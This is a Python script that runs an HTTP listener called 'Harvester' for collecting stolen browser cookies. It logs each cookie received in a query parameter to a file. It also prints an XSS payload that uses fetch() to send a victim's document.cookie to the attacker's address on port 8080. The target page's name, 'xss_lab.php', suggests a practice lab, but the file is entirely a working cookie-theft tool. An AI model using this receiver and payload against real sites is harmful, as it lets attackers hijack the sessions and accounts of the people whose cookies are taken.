import http.server
import socketserver
import urllib.parse
import threading
import webbrowser

PORT = 8080
LOG_FILE = "../logs/cookies.txt"

class Harvester(http.server.SimpleHTTPRequestHandler):
    def log_message(self, format, *args):
        pass
    def do_GET(self):
        if 'c=' in self.path:
            cookie = urllib.parse.unquote(self.path.split('c=')[1].split(' ')[0])
            with open(LOG_FILE, 'a') as f:
                f.write(cookie + '\n')
            print(f"\033[91m[+] COOKIE: {cookie}\033[0m")
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(b"<script>alert('done');</script>")

with socketserver.TCPServer(("0.0.0.0", PORT), Harvester) as httpd:
    print(f"\033[93m[LISTENER] http://0.0.0.0:{PORT}\033[0m")
    print("Send victim to: http://victim/xss_lab.php?name=<script>fetch('http://YOUR_IP:8080/?c='+document.cookie)</script>")
    webbrowser.open(f"http://localhost:{PORT}")
    httpd.serve_forever()